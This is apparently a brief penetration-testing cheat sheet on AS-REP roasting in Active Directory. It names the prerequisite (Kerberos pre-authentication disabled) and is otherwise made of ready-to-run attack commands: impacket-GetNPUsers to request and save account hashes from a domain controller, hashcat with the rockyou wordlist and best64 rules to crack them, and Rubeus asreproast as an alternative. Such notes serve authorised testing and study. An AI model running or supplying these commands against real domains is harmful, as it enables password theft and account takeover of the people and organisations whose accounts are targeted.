# AS-REP Roasting

__REQUIRES__

 - Kerberos pre-authentication to be turned off (Do not require Kerberos preauthentication = disabled)

as-rep roast attack
```bash
impacket-GetNPUsers -dc-ip $ip  -request -outputfile hashes.asreproast $domain/$user
```

crack hash(es)
```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Using Rubeus (you'd crack this with hashcat as well)
```powershell
.\Rubeus.exe asreproast /nowrap
```